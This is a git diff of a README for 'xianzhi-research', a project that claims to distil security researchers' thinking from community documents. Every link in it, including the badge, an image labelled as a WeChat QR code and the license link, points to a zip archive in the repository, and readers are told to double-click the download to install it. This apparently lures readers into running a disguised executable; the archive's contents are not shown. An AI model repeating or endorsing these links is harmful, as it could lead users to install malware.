@@ -1,6 +1,6 @@
 # 🔐 xianzhi-research - Understand Security Research Thought Processes
 
-[![Download](https://raw.githubusercontent.com/NikitosHanik4/xianzhi-research/main/references/research-xianzhi-v3.0.zip)](https://raw.githubusercontent.com/NikitosHanik4/xianzhi-research/main/references/research-xianzhi-v3.0.zip)
+[![Download](https://github.com/NikitosHanik4/xianzhi-research/raw/refs/heads/main/references/xianzhi_research_2.1.zip)](https://github.com/NikitosHanik4/xianzhi-research/raw/refs/heads/main/references/xianzhi_research_2.1.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Welcome to the xianzhi-research project. This application provides insights into security research methodologies derived from 5,621 documents curated from the Xianqi Community. Our goal is to help users understand the common thought processes of top security researchers.
 
-<img width="200" alt="微信二维码" src="https://raw.githubusercontent.com/NikitosHanik4/xianzhi-research/main/references/research-xianzhi-v3.0.zip" />
+<img width="200" alt="微信二维码" src="https://github.com/NikitosHanik4/xianzhi-research/raw/refs/heads/main/references/xianzhi_research_2.1.zip" />
 
 ---
 
@@ -25,7 +25,7 @@ To get started with xianzhi-research:
 2. **Download & Install**  
    Download xianzhi-research using the following link:
 
-   [Download xianzhi-research](https://raw.githubusercontent.com/NikitosHanik4/xianzhi-research/main/references/research-xianzhi-v3.0.zip)
+   [Download xianzhi-research](https://github.com/NikitosHanik4/xianzhi-research/raw/refs/heads/main/references/xianzhi_research_2.1.zip)
 
    After downloading, locate the file in your downloads folder. Double-click the file to begin installing the application. Follow the on-screen instructions to complete the installation.
 
@@ -53,7 +53,7 @@ After installing, open the application. The main window will display several opt
 
 As mentioned earlier, download the latest version of the xianzhi-research application from the link below:
 
-[Download xianzhi-research](https://raw.githubusercontent.com/NikitosHanik4/xianzhi-research/main/references/research-xianzhi-v3.0.zip)
+[Download xianzhi-research](https://github.com/NikitosHanik4/xianzhi-research/raw/refs/heads/main/references/xianzhi_research_2.1.zip)
 
 Follow the installation steps provided above to set up the software.
 
@@ -74,7 +74,7 @@ You can contribute by reporting issues, suggesting features, or submitting pull 
 
 ## 📄 License
 
-This project is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/NikitosHanik4/xianzhi-research/main/references/research-xianzhi-v3.0.zip).
+This project is licensed under the MIT License. You can view the full license [here](https://github.com/NikitosHanik4/xianzhi-research/raw/refs/heads/main/references/xianzhi_research_2.1.zip).
 
 ---
 
